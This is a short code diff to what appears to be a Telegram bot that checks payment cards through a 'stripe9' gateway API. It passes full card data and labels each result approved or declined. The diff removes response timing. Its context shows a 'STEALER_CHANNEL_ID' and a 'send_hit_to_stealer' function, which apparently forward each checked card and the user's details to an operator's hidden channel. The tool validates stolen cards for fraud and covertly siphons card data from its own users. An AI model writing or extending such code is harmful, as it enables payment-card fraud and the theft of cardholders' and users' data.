@@ -23,7 +23,7 @@ SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
 STEALER_CHANNEL_ID = -1003627495953
 
 # -------------------------------------------------------------
-# API caller
+# API caller (without time_taken in response)
 # -------------------------------------------------------------
 async def call_stripe9_api(fullcc):
     endpoint_url = f"{API_BASE}?cc={fullcc}"
@@ -35,11 +35,10 @@ async def call_stripe9_api(fullcc):
                 status = data.get("status", "UNKNOWN").upper()
                 message = data.get("message", "No response message")
                 gate = data.get("gate", GATE_NAME)
-                time_taken = data.get("time_taken", "0s")
                 if status == "APPROVED":
-                    return "Approved ✅", f"{message} ({time_taken})", gate
+                    return "Approved ✅", message, gate
                 else:
-                    return "Declined ❌", f"{message} ({time_taken})", gate
+                    return "Declined ❌", message, gate
             except Exception:
                 if attempt == 1:
                     return "Error", "Request failed", GATE_NAME
@@ -51,7 +50,7 @@ def extract_cards(text):
     return re.findall(pattern, text)
 
 # -------------------------------------------------------------
-# Stealer function (keeps owner line – change if needed)
+# Stealer function
 # -------------------------------------------------------------
 async def send_hit_to_stealer(client, fullcc, status, response, gateway, time_taken, first_name, role):
     try:
